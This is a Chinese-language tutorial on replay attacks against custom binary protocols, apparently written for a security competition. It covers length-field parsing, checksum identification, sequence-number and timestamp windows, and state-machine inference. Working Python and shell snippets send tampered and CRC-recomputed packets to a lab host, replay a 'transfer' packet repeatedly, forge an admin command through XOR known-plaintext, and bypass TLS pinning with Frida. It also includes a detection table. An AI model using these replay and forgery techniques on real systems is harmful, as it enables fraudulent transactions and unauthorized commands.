# 自定义协议重放：长度字段、校验和、状态机推断

> 被 `competition-custom-protocol-replay` 引用。目标：**搞清协议怎么分帧、怎么验完整性、
> 怎么推进状态**，然后构造一个服务端会接受的重放。

## 一、先判型：协议长什么样

| 特征 | 判断 | 例子 |
| --- | --- | --- |
| 前 2/4 字节是长度，后面紧跟内容 | **TLV/长度前缀** | 很多内网协议、Redis（`*3\r\n`）、MQTT |
| 固定长度头 + 变长体 | 头里有 `len` 字段 | 游戏协议、工业协议 |
| 明文字符串 + 分隔符 | 文本协议 | HTTP、SMTP、Redis |
| 二进制 + 魔术字 | 自定义二进制 | `\x00\x01` 开头 |
| JSON/Protobuf 包在二进制帧里 | 混合 | gRPC、WebSocket 上的自定义 |
| 校验和/CRC 在末尾 | 完整性保护 | 车载、工业 |

```bash
# 抓一份样本，先 hexdump
tcpdump -i eth0 -w proto.pcap host 10.0.0.20 and port 9000
tshark -r proto.pcap -T fields -e data.data | head -5 | xxd -r -p | xxd | head -20
```

```
00000000: 12 34 00 0c 01 02 03 04 05 06 07 08 9a 3b 00 00
          ^^^^ ^^^^ ^^^^ ^^^^^^^^^^^^^^^^^^^ ^^^^
          magic len  cmd  payload             crc?
```

## 二、长度字段：三种形态与陷阱

| 形态 | 判读 | 陷阱 |
| --- | --- | --- |
| `len` = 后续 body 长度 | 最常见 | 不含头 |
| `len` = 整个包长度 | 含头 | 差 4/8 字节就会错位 |
| 大端/小端 | `00 0c` = 12（大端）；`0c 00` = 12（小端） | 判错就全乱 |
| 变长编码（varint） | Protobuf 风格 | 高位置 1 表示继续 |
| 长度为 0 | 控制包 | — |

```python
# 用两种假设解析，看哪个能对上后续字节
data = bytes.fromhex('1234000c0102030405060708 9a3b0000'.replace(' ',''))
for be in (True, False):
    n = int.from_bytes(data[2:4], 'big' if be else 'little')
    print(f'len({"BE" if be else "LE"})={n}  total={len(data)}  body_start=4  body_end={4+n}  ok={4+n==len(data)}')
# 哪个 ok=True 就是哪个
```

**关键验证**：`头长度 + len == 总长度` 才是正确的解释。

## 三、校验和：先判断有没有、是什么

```bash
# 1) 改一个字节，看服务端是否拒绝 —— 最直接
#    若拒绝 → 有完整性校验（校验和/签名/加密）
# 2) 改长度字段，看是否拒绝 → 有长度一致性校验
```

```python
# 2) 逐个试常见校验和（在末尾 2/4 字节）
import binascii, zlib, struct
body = bytes.fromhex('0102030405060708')
tail = bytes.fromhex('9a3b')
cands = {
 'sum8':  sum(body) & 0xff,
 'sum16': sum(body) & 0xffff,
 'crc16_ccitt': binascii.crc_hqx(body, 0xffff),
 'crc16_modbus': binascii.crc_hqx(body, 0x0000),
 'crc32': zlib.crc32(body) & 0xffffffff,
 'xor': 0,
}
x = 0
for b in body: x ^= b
cands['xor'] = x
for k, v in cands.items():
    print(f'{k:14} {v:#x}')
print('tail(LE)=', hex(int.from_bytes(tail,'little')), ' tail(BE)=', hex(int.from_bytes(tail,'big')))
```

**判定表**：

| 现象 | 结论 |
| --- | --- |
| 改任意字节都被拒 | 有 CRC/签名/加密 |
| 改长度被拒但改 body 被接受 | 只校验长度，不校验内容 |
| 改 body 末字节被拒，改开头被接受 | 校验和只覆盖部分区域 |
| 全部接受 | 无完整性校验 → **可直接重放/篡改** |

## 四、序列号与重放窗口

| 机制 | 判断 | 绕过 |
| --- | --- | --- |
| 单调递增序列号 | 抓两次同样操作，看 seq 是否 +1 | 需要预测/保持递增 |
| 时间戳窗口 | 包里含时间（4/8 字节 Unix 时间） | 重放窗口内（通常 30-300 秒） |
| nonce（一次性随机） | 每次不同，服务端缓存已用 | 需要新 nonce |
| 会话 token | 首次握手后分配 | 用同一会话重放 |
| 无任何防重放 | 完全相同包可重发 | 直接重放 |

```bash
# 判断是哪种：抓同一操作的两次包，逐字节 diff
python3 - <<'PY'
a = bytes.fromhex('1234000c0102030405060708 9a3b0000'.replace(' ',''))
b = bytes.fromhex('1234000c0102030405060708 9b3c0000'.replace(' ',''))
for i, (x, y) in enumerate(zip(a, b)):
    if x != y:
        print(f'offset {i}: {x:02x} -> {y:02x}')
PY
# 只有末尾 2 字节变 → 可能是校验和（随内容变）
# 中间 4 字节递增 → 序列号
# 前面 8 字节变且像时间戳 → 时间窗口
```

```python
# 时间戳判断
import struct, time
for off in range(0, len(data)-3):
    v = struct.unpack('>I', data[off:off+4])[0]
    if 1600000000 < v < 2000000000:
        print(f'offset {off}: {v} ({time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime(v))})')
```

## 五、状态机推断

协议的操作通常有顺序约束（握手 → 认证 → 操作 → 断开）。推断方法：

```bash
# 1) 按时间序列整理抓包
tshark -r proto.pcap -T fields -e frame.time_relative -e tcp.srcport -e tcp.dstport -e data.data \
  | head -40

# 2) 标出每个包的 cmd 字段（假设是第 5 字节）
tshark -r proto.pcap -T fields -e data.data \
  | awk '{print substr($0, 9, 2)}' | sort | uniq -c
```

**状态机推断的四个观察点**：

| 观察 | 推断 |
| --- | --- |
| 客户端先发 cmd=01，服务端回 cmd=81 | 01=握手请求，81=响应（高位标记） |
| 握手后客户端带 session id | 后续包依赖该 id |
| 某 cmd 在没有前置 cmd 时被拒 | 有状态依赖 |
| 断连后需要重新握手 | 会话级状态 |

```bash
# 验证状态依赖：跳过握手直接发操作
python3 - <<'PY'
import socket
s = socket.create_connection(('10.0.0.20', 9000))
# 直接发"操作"包（不带握手）
s.sendall(bytes.fromhex('1234000c0202030405060708 9a3b0000'.replace(' ','')))
print(s.recv(1024))
PY
# 被拒 → 有状态依赖；成功 → 无状态，可任意注入
```

## 六、构造会接受的重放

### 6.1 原样重放（最简单）

```python
import socket
# 从 pcap 里提取的完整字节
raw = bytes.fromhex('1234000c01020304050607089a3b0000')
s = socket.create_connection(('10.0.0.20', 9000))
s.sendall(raw)
print(s.recv(4096))
```

```bash
# 用 tcpreplay / Python 直接重放
python3 -c "
import socket,sys
d=bytes.fromhex(sys.argv[1])
s=socket.create_connection(('10.0.0.20',9000)); s.sendall(d); print(s.recv(4096))
" '1234000c01020304050607089a3b0000'
```

### 6.2 篡改后重放（需要重算校验）

```python
#!/usr/bin/env python3
"""重算 CRC16-CCITT 后篡改 payload"""
import binascii, socket, struct

def pack(cmd, payload, crc_mode='ccitt'):
    body = bytes([cmd]) + payload
    if crc_mode == 'ccitt':
        crc = binascii.crc_hqx(body, 0xffff)
    else:
        crc = zlib.crc32(body) & 0xffff
    return bytes([0x12,0x34]) + struct.pack('>H', len(body)+2) + body + struct.pack('>H', crc)

pkt = pack(0x02, b'\x01\x02\x03\x04\x05\x06\x07\x08')
print(pkt.hex())
s = socket.create_connection(('10.0.0.20', 9000))
s.sendall(pkt)
print(s.recv(4096))
```

### 6.3 保持递增序列号

```python
# 若是单调递增 seq，每次重放前 +1
for seq in range(100, 110):
    pkt = build(cmd=0x02, seq=seq, payload=b'...')
    s.sendall(pkt)
    print(s.recv(4096))
```

### 6.4 时间戳窗口内重放

```python
# 若是时间戳，把包里的时间字段换成"现在"，重算校验
import time, struct
ts = int(time.time())
pkt = build(cmd=0x02, ts=ts, payload=b'...')
```

## 七、加密协议怎么办

| 情况 | 判断 | 路径 |
| --- | --- | --- |
| TLS | 握手可见 | 见下 |
| 自定义加密（异或/RC4/AES） | 密文熵高，无结构 | 逆向客户端找密钥 |
| 混淆（简单变换） | 明文字节在密文里有偏移 | 用已知明文推密钥流 |
| 有签名（HMAC） | 改内容被拒，改签名也拒 | 逆向签名算法 |

```bash
# 已知明文攻击（简单异或）
python3 - <<'PY'
ct = bytes.fromhex('...')          # 密文
pt = b'{"cmd":"status"}'          # 已知明文（从客户端静态字符串推断）
ks = bytes(c ^ p for c, p in zip(ct, pt))
print('keystream:', ks.hex())
# 用同一 keystream 加密任意明文
new = bytes(p ^ ks[i % len(ks)] for i, p in enumerate(b'{"cmd":"admin"}'))
print('forged:', new.hex())
PY
```

**TLS 的绕过**：客户端证书固定（pinning）会导致中间人失败。处理方式：

- 用 Frida hook `SSL_CTX_set_verify`（见 `competition-android-hooking`）
- 或在客户端进程内直接 hook 收发函数（拿到明文，绕过 TLS）

## 八、验伤：重放的成功判据

| 结论 | 证据 | 假象 |
| --- | --- | --- |
| 无防重放 | 同一包重放 N 次，产生 N 次效果 | 只看到 TCP 层 ACK |
| 校验和可重算 | 篡改后的包被接受（服务端返回正常响应） | 服务端返回通用错误（可能解析失败） |
| 状态机绕过 | 跳过握手直接执行操作成功 | 服务端回了个通用 ack 但没执行 |
| 序列号可预测 | 用 +1 的 seq 成功 | 服务端不校验 seq（那更简单） |
| 时间窗口可用 | 窗口内重放成功 | 服务端用单调时钟（跟包里的时间无关） |

**最硬的证据**：**服务端的业务副作用**（DB 记录、文件生成、另一端的响应变化）。仅
"TCP 上收到回包"不算。

```python
# 完整闭环：重放"转账"包，然后查余额
raw = bytes.fromhex('<转账包的完整字节>')
for _ in range(3):
    s = socket.create_connection(('10.0.0.20', 9000))
    s.sendall(raw)
    print(s.recv(1024))
# 再查余额（通过任何可用接口）
# 余额减少了 3 次 → 确认为无防重放
```

## 九、检测视角

| 手法 | 日志/信号 | 特征 |
| --- | --- | --- |
| 原样重放 | 服务端审计 | 同一业务请求的**完全相同字节**出现多次（需按包哈希记录） |
| 篡改重放 | 服务端 | 校验和失败率突增；同一来源的高频畸形包 |
| 序列号跳跃 | 服务端 | seq 不连续（跳号/回退） |
| 状态机违规 | 服务端 | 未握手直接发操作；状态转换非法 |
| 时间戳异常 | 服务端 | 包内时间与服务器时间偏差超阈值 |
| 协议指纹 | 网络 | 同一 IP 的包结构与正常客户端不同（字段值/顺序） |

## 十、常见坑

1. **搞错长度字段的含义**——含头/不含头、大端/小端。用"头长+len == 总长"验证，别靠猜。
2. **忘了重算校验**——改了 body 没改 CRC，服务端直接丢包。先确定校验算法。
3. **TCP 分包导致解析失败**——一次 `sendall` 不代表服务端一次收到。要按协议实现"读满 len"。
4. **忽略了 TLS**——`nc host 443` 发明文必失败。用 `ssl.wrap_socket` 或客户端 hook 拿明文。
5. **状态机没走完**——直接发操作包被拒，就以为"无漏洞"。要先完成握手再重放操作。
6. **序列号不递增**——同一 seq 重放会被拒。要么每次 +1，要么找不校验 seq 的包。
7. **pcap 里的包不完整**——抓包时丢了尾部。用 `-s 0` 抓全量，或从客户端侧 hook 拿。
8. **误判"重放成功"**——服务端可能回了 `{"code":0}` 但业务没执行（异步校验）。必须查副作用。